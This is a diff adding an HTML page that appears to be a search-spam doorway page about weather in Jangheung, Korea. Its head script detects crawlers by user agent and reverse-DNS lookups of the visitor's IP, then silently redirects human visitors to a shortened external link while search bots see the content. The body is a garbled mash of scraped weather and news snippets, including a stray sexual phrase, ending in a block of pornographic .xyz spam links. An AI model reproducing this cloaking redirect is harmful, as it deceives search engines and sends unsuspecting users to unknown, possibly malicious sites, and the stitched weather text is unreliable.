@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>11090</title>
+</script>
+</head>
+<body>
+<h1>장흥 날씨</h1>
+<p>오전 5시. 64°. RealFeel® 64°. 쾌적함. rain drop 7%. 흐림. RealFeel®64°. 바람동 5mi/h. 돌풍10mi/h. 습도79%. 이슬점57° F. 대기질보통. 구름량99%. 가시거리5mi.장흥군, 전라남도 ; 현재 기상. PM 4:59. 65°F · RealFeel® 64° ; 오늘. 6. 1. 69°최고. RealFeel® 72° ; 오늘 밤. 6. 1. 67°최저. RealFeel® 64°.시간별 날씨-장흥읍, 전라남도. 14:22 KST 기준. 비. 15:30 경에 비가 내릴 가능성이 있습니다.Weather.com은 평균/최고 기록 및 최고/최저 온도 예측 등을 통해 장흥읍, 전라남도에 대한 가장 정확한 월간 일기예보를 제공합니다. ... 월별 날씨-장흥읍, 전라남도.날씨 ; 기온(˚C), 17, 15 ; 강수량(mm) ; 풍속(m/s), 1, 1 ; 습도(%), 82, 80 ...시간: 날씨,기온: 풍향,풍속: 습도: 1시간 강수량. 현재: 18.2℃: 동 1.5m/s: 82%: -. 16시 예보: 흐림: 19℃: 북동 1m/s: 80%. 17시 예보: 빗방울 ...날씨 상황: +21.3 °C , 기압은 정상범위 안에 있음, 높은 습도 (79%), 동남동에서 부는 남실바람 2 m/s 7 kmh 4 mph 4 노트 2 Bft. 오늘 장흥의 기온은 +29 예상됩니다.장흥 내일 날씨 2023년 06월 02일, 금요일 ; 흐림. 흐림, 약한 비 흐림, 약한 비. 흐림 ; 19°C · 19°C · 19°C ; 19°C · 19°C · 19°C ; 0 mm. 0 mm. 0 mm ; 97 %. 97 %. 98 %.장흥 내일 날씨 2023년 06월 01일, 목요일 ; 흐림. 흐림. 흐림 ; 17°C · 17°C · 17°C ; 17°C · 17°C · 17°C ; 0 mm. 0 mm. 0 mm ; 99 %. 97 %. 97 %.(6월3일). 일출/일몰, 05:21 / 19:40, 05:20 / 19:40, 05:20 / 19:41. 풍향/풍속, 동 / 6ms, 북 / 4ms, 북 / 4ms. 날씨경향, 비온후 갬, 구름많음, 구름많음.MeteoTrend:날씨장흥를 위한 오늘날,내일 주습니다. 정확하고 상세 일기 예보장흥니다. 온도와 습도,공기의 압력,속도,바람의 방향,강수량,바니다. 장흥, 전라남도 ...장흥군 대한민국: 현재, 시간별, 14일 일기 예보, 레이더, 강수, 자외선 지수, 바람 , 사진 작가의 날씨 사진.장흥에서 연중 기후 및 평균 날씨 대한민국. 장흥에서, 여름은 따뜻한, 습기가 있는, 비가오는 및 부분적으로 흐린, 겨울은 매우추운, 눈이오는 및 대부분 맑은 입니다 ...날짜; 예보; 나절시간; 날씨; 강수확률; 강수량; 최저/최고기온; 시간별날씨; 시간별 강수확률; 시간별 기온; 시간별 기온 그래프; 시간별 풍향/풍속 ...장흥 공기질 지수 (AQI)는 현재 좋음입니다. 지난 기록을 포함하여 실시간 예보인 PM2.5와 날씨 데이터를 받으세요. AirVisual로 대한민국의 장흥의 공해에 대한 정보 ...전라남도, 장흥군에 대한 분 단위 예측이 필요하세요? MSN 날씨은(는) 강수 예측부터 악천후 경고, 대기 질 업데이트, 산불 경고에 이르기까지 모든 것을 추적합니다.물때표, 물때(날짜별), 물때달력, 윈디날씨, 상세날씨, 바다날씨, 바다수온, 미세먼지, 조위관측소, 낚시포인트, 일출몰, 지도, 낚시영상 ...이설희 저기가 장흥??언제 함 가야겠는데. 8 yrs. 설희. 명상 서희 짱??✌✌✌✌  . 8 yrs. 1. 박지영. 장흥이라고? 8 yrs. 1. 김석순. 민진아^^날씨 오늘좋네^^.오늘날씨 정말 춥나 봅니다 탐진강변이 꽁꽁 얼었네요 다들 따숩게 입고 외출들 하세요^^148 likes, 9 comments - 김혜진 (@jjinjjin_hazelkim) on Instagram: "#마장호수트레킹 울뺀님들과 장흥 트레킹~! 날씨좋코~~ 경치좋코~~사람들 ..."Feb 1, 2019 — 여기 장흥은 2월인데 아직도 눈이 오네요. 다른 지역은 어떤가요? 눈이 작게 내리는 것도 아니고 아주 펑펑펑팡팡팡프아앙퐈앙팡팡!! 하고 오네요..[날씨] 막바지 장맛비 계속...장흥 물 축제 개막. 2019년 07월 27일 13시 19분 댓글. 글자크기 조정하기. 글자크기 조정하기 글자 크기 조정창 닫기.Jun 21, 2022 — 21일 고흥· 보성· 장흥· 강진은 무더운 날씨를 보이고 일부 지역은 소나기가 내릴 것으로 관측된 가운데 한국형 발사체 누리호 2차 발사가 예정되어 ...Nov 13, 2020 — 코로나19를 극복할 것 같은 좋은 날씨코로나19의 사태가 우리 모두의 삶에 끼친 영향은 황당하고 불안 했으며 그 여파는 일상의 리듬을 조절하기 ...Feb 7, 2015 — 장흥대회가 열리는 일요일 날씨가 움츠러들것 같다. 오늘 낮 기온도 영상7도까지 올라가는데 대회당일은 영하권에 맴돌것 같구나... 특히 풀뛰는 친구들은 ...전남 장흥 날씨 [6198]. 오후12:01~18:00+20.+21 °C조금 비. 일요일:해돋이 05:57, 일몰 19:07. 아침06:01~12:00+6.+16 °C맑은 하늘. 새벽00:01~06:00+8.오늘 구름 많은 날씨 예상되는 가운데 기온은 더 높게 올라 덥겠습니다. 아침기온 17도 안팎으로 어제보다 3도 높습니다. 한낮기온 27도로8 hours ago — 기상청은 현충일을 포함한 징검다리 연휴가 있는 1~6일 사이 날씨를 전망했다. 기상청은 1일 현재 비가 내리고 있는 충청남부 이남 지역을 제외하고 6 ...13 hours ago — 목포의 한낮 기온 23도, 영암 24도, 장흥 22도가 예상되고요, 흑산도와 가거도는 20도에 머물겠습니다. 서해남부 남쪽 먼바다에는 풍랑주의보가 발효 ...전남 장흥 날씨 [78c7]. 일요일:해돋이 05:49, 일몰 19:12. 아침06:01~12:00+16.+18 °C조금 비. 달:문라이즈 06:57, 월몰 21:32, 장흥군의 남쪽은 회진면의 회진성이 ...16 hours ago — 지역별 아침 최저기온은 곡성 15도, 장성·담양·화순·영광·구례·보성 16도, 나주·함평·무안·영암·순천·광양·강진·장흥·해남·고흥 17도, 광주·목포·진도· ...2 hours ago — 왕윤채 의장은 “오직 군민의 행복과 살기 좋은 장흥을 만들기 위해 제9대 장흥군 의회는 노력해 왔다”라면서“앞으로도 공감 받는 의정!, 실천하는 의회!8 hours ago — 매일일보 = 김금옥 기자 | 전남 장흥군은 5월 31일 정남진 삼산방조제에서 “깨끗한 바다, 도약하는 어촌경제”를 주제로 제28회 바다의 날 기념식을 ...8 hours ago — 오늘‧내일 강수 및 이후 날씨 전망. 오늘과 내일 날씨는 어떤가요? 오늘은 남해상에 위치한 정체전선의 영향으로 광주와 전남은 내일 새벽까지 가끔 ...[매일안전신문=김진섭 기자] 2일인 금요일은 전국이 대체로 맑은 가운데 한 낮 최고기온이 32도까지 오르면서 무덥겠다.아침 최저기온은 16~21도, 낮 최고기온은 23~32 ...4 days ago — 아침 최저기온은 영광·함평·목포·무안·진도·신안·해남·여수 19도, 광주·나주·장성·담양·화순·영암·순천·광양·구례·곡성·완도·강진·장흥·고흥·보성 20 ...7 hours ago — 장흥군은 5월 31일 정남진 삼산방조제에서 “깨끗한 바다, 도약하는 어촌경제”를 주제로 제28회 바다의 날 기념식을 개최했다.바다의 날은 바다가 ...12 hours ago — [전남매거진=박미라 ]6월 첫 날인 오늘 전남 곳곳에 비 소식이 있다. 비는 오늘 오전부터 시작되어서 내일 새벽까지 내리겠으며 돌풍과 천둥, ...전남 장흥 날씨 [f6ca]. 저녁18:01~00:00+7.+13 °C맑은 하늘. 저녁18:01~00:00+9.+15 °C부분적으로 흐린 날씨. 지 자기장: 조용한. 바람서 15km/h.장흥 오늘 날씨. 달의 위상: 장흥 내일 날씨. 8 수퍼컴예보. ID 저장. 11시 현재. 9 지역별날씨. 러시아 월드컵. 많이 본 뉴스. 공기 온도:+16 °C 아침기온 5도 안팎 ...8 hours ago — [세계뉴스통신 디지털편성부] 장흥군농어촌신활력센터는 5월 27일 장흥군청 앞 광장에서 제1회 멍석을깔아주겠소 버스킹공연과 문화나눔장터 장흥로플 ...공기 온도:+12 °C 오렌지 호의 평균 시속은 63㎞으로 장흥군 노력도항과 성산포항 ... 장흥 수요일 날씨 장흥 주간 날씨 장흥 내일 날씨 이번주 장흥 날씨 장흥에서 ...전남 장흥 날씨. 새벽00:01~06:00+8.+9 °C의 많은 구름. 태양 ...2 days ago — (장흥=연합뉴스) 장아름 기자 = 광주지법 장흥지원 형사1부(김태균 지원장)는 30일 공직선거법 위반 혐의로 기소된 김성 전남 장흥군수에게 벌금...전남 장흥 날씨. 아침06:01~12:00+16.+18 °C조금 비. 지 자기장 ...장흥 날씨. 남해안 등 지리산 부근은 내일까지 150mm 이상의 비가 오겠고, 또 워터파크와 DJ 풀파티 등 여러 ...전남 장흥 날씨 [f2d7]. 자외선 지수: 4,8 (보통). 지 자기장: 조용한. 오후12:01~18:00+18.+21 °C조금 비. 바람서 13km/h. 오후 10시. 오후 6시.2 days ago — [천지일보 장흥=천성현 기자] 전남 장흥군이 30일 군청 회의실에서 간부 공무원을 대상으로 '직장 내 갑질 근절 다짐 결의대회'를 개최했다.[939a] 전남 장흥 날씨 미스 코리아 섹스 아침06:01~12:00+7.+9 °C비. 새벽00:01~06:00+6.+7 °C흐린. 오후12:01~18:00+15.+17 °C흐린. 3에서 5의 자외선 지수는 보호 ...2 days ago — 정필=이승현 기자 kspa@jeongpil.com] 장흥소방서 119생활안전순찰대가 의용서포터즈와 함께 30일 장흥군 장흥읍 월평마을을 찾아 재난 취약가구의 ...2 days ago — [더시그널뉴스=김정우 기자] 장흥소방서 119생활안전순찰대가 의용서포터즈와 함께 30일 장흥군 장흥읍 월평마을을 찾아 재난 취약가구의 화재 예방 ...6 hours ago — 고흥20 이상14.74.314.750정온1016.4. 장흥20 이상15.11.515.140남남동1016.2. 남해20 이상 …[1f69] 별내 날씨 landscaping holland mi 한편, 같은 날 ...7 hours ago — 다산 동 날씨 다산동, 경기도 ; 오전 9시. ... 남도맛기행 (장흥삼합+풍천장어구이+특한정식)~ 장흥편백나무숲/선운사/다산초당/가우도 (회원특가),, ...15 hours ago — 남이섬 날씨 Get the 가평군, 경기도, 대한민국 local hourly forecast ... 2023 — 강원도: 철원장흥 137.5 사내(화천) 78.5 남이섬(춘천) 60.5 ...9 hours ago — 여수 바다날씨 ; 전남동부남해앞바다 · 구름많고 한때 눈 · 10-16, ... 담양 목포 무안 보성 순천 신안 여수 영광 영암 완도 장성 장흥 진도 함평 ...8 minutes ago — 7일 용인 주간날씨예보 06.04.2023 Administrator 용인 주간날씨예보 용인 주간 ... 충청북도(영동), 전라남도(고흥, 보성, 여수, 순천, 장흥, 강진, ...19 hours ago — 순천 내일 날씨 순천, 내일 날씨월요일 23 1월 2023 · 오늘: 6°C ... 여수 영광 영암 완도 장성 장흥 진도 함평 해남 화순. arrow 여수 현재 날씨02월 ...6 hours ago — 평택 주간 날씨 평택시, 경기도 ; 오후 3시. ... 목포·무안·영암·신안·구례·곡성·보성 6도, 광주·진도·순천·광양·완도·강진·장흥·해남·여수·고흥 7도, ...4 hours ago — ... 신촌 1 인샵 이가 썩다 영어 표현 전남 장흥 날씨 - 전남 장흥 날씨 Kusf 클럽챔피언십 배구 프리미어 빌리지 다낭 리조트 매니지드 바이 아 코르 ...7 hours ago — 서산날씨 기상정보 서산시, 충청남도 ; 현재 기상. ... 홍성), 충청북도(영동), 전라남도(고흥, 보성, 여수, 순천, 장흥, …acum 5 zile — 현재위치.12 hours ago — 양주 송추 장흥 백석 가는 입구에 …10 mai 2021 — 송추 IC 인근 중식당 진흥관(짜장면, 짬뽕, ... 주차는 진흥관에하고 날씨좋아 계곡산책하고.<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
